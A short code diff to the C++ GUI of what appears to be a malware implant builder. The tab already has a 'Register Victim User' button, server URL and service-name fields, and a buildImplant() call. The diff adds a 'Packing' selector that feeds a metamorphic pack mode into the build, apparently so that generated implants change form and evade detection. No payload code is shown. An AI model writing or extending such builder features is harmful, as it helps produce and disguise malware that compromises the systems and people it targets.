@@ -2,6 +2,7 @@
 #include "FileBrowser.hpp"
 #include "LogManager.hpp"
 #include "Util/SafeString.hpp"
+#include <Metamorphic/PackMode.hpp>
 
 #include <format>
 
@@ -72,6 +73,15 @@ void drawBuilderTab(WindowState& state) {
     }
     form.next_row();
 
+    GuiLabel(form.label_rect(), "Packing:");
+    if (GuiComboBox(
+            form.field_rect(),
+            metamorphic::kPackModeComboLabels,
+            &settings.pack_mode) > 0) {
+        state.builder.setPackModeIndex(settings.pack_mode);
+    }
+    form.next_row();
+
     if (GuiButton({form.field_x + 230.0f, form.cursor_y, 250.0f, ui::kControlHeight}, "Register Victim User")) {
         auto& logs = LogManager::instance();
         state.builder.setServerURL(settings.server_url.text);
@@ -94,6 +104,7 @@ void drawBuilderTab(WindowState& state) {
         state.builder.setServiceName(settings.service_name.text);
         state.builder.setServiceDesc(settings.service_description.text);
         state.builder.setOutputDir(settings.output_file_path.text);
+        state.builder.setPackModeIndex(settings.pack_mode);
 
         state.builder.buildImplant();
     }
